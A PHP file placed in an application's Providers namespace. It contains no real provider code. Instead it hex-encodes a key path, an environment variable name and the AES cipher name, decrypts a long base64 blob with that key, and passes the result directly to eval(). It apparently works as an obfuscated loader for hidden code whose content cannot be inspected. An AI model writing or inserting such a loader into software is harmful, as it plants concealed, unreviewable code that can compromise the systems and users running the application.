<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('T45zceE5Bi1v4miAdt43lw==');

$c=base64_decode(

'scQc8jnQofdpvv0bZugK8UuO+/zUjEhcqh3fPw5o3Ldy5oHZvP6H+lojHY2awyH5VSr21mZSD8qo' .
'ET2RR5sy381uBL0SIx0I/U243dQMHwzKWqQ39M8dIHHPRmUttpIEjaHG3OKmtwgzBALYGe5PF3//' .
'HQDuuv7eNTC6FlYApfaLx0CNs+04nkcAXTcpufTlDumzzd8cHKpu9YVMbvlpKRov2juoVFBixTk4' .
'qspW2zJnZugyM4waJCRm21Xwz7mDW+o9h1Ub5vIzKysSwp3AGmNOk2BpTGvHjNPyVRC2wzka6D1F' .
'5/nYnk4QZBdW/FMasvMEKeaMn+Uwk68F2ZuMEPmv0sMUGtASnemLKwlkbufYJcohX42bvx3Q6BaI' .
'KBpABAIgcLioN+kl6AakdmnajQpev+iV3rI7Zvc92BZT2qv3kR+b8M41LPtZiiPpj6pSvZJ+7Exj' .
'WLL+/LPxBb02xN3mrgFs1tNKGe9LZlQuH1dFKr4Wi6knCAfwt/QRCnjs9UC2nRLWNndW0zoU8Q97' .
'+Uz/PqeMUwjbMTMEZPZvWtCHkTUup62vmtbIBS/xy/VFVeRjeB6+UveK1NN2Vh/6Yat5Zj28U2wF' .
'3gArn28oGx2elf3Els6E0WMIT0fzB1ZpM03nKFyTCtWjavut0g1kx7CVttmH+Gp9FzHBk3HYBc8E' .
'1RPeQxHH66nPkK6MyaRCM51K9lEVnyLvb8NgvQ+LBLDr62h07a7hc+pQ/OmMH5MbHMYljbgniIvZ' .
'Wsi32FKcg24lMUovjVMKjhXejswfJwj7+zjACGOSw98SQp9kdWfxQP/GrcroLWRLSZT5rfIwtACD' .
'EUZjXA0IqnrPvpvLv96UDxnWxH47Ij63o5FMQEVY/duKjkYLUjt6+SkWCGt99V9ncVUUbvkdOM5Q' .
'gKW77tzRigWMx3h/bHNfmNq3MmUo7avcnmbXVRawsA0aCVcF+eoa9526w3ZrHy+jACXO8jU4cSEB' .
'HYuMR665pn14+IEBLg0AnK2xF8v4TzPTh1PaKacL2zSmCCJcwqvzq32NIj4eCF65bDjT9pNS54Xo' .
'Ggi8b1YnGu3YbuWxSne6tQPmhdJz0OOSgyN+klzLM53j5PemMQgNsaXgombZR8/sY7H5x3lmr5Iq' .
'Mb70kBbmu2Hozg2gmHu3A18L62WaaYdHeCvZCYXt7zL78DM5JNraaRn8JFnpPXbGHwBjl1B5ggJd' .
'7N8/N1vG5O1jaoh6/oR0RRYWubpSF4z10f/EbnA0Bfc3wZed6zvV5FgS3wKWqECprpY9V1xbJKg/' .
'ln6LlB7x8rQ5+lZalhij5kDk2BlDzQHVjQwN8VvZgTEn7x4sx05D4PEgDMNNKS645TABsy4lhaxd' .
'NFQmS1095lJOq53BBKeWI6sC4gfuqU7X1uryJ4utd/bkB5HshmESe3FxA2A+QvcSFbhphDLS5xoh' .
'Vup3qjwgE9BS7V5amw9s+GpurO//3oMq6qEMTIDW7O7dykJ6qPYw6p2ijdwo7W2EFbjKSjwM7pQ9' .
'aZvRRmrRKVVKmbXmFfN4HBxOYNqiea8DqN2L/j22bjrGt3Hte4gf69/C5uWQQ3WdX9xM/0CTgIIm' .
'Y6vF+wmqM6CwWwSRwkUKiLmPttDGd3LTNimgLM8NlCKbND8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

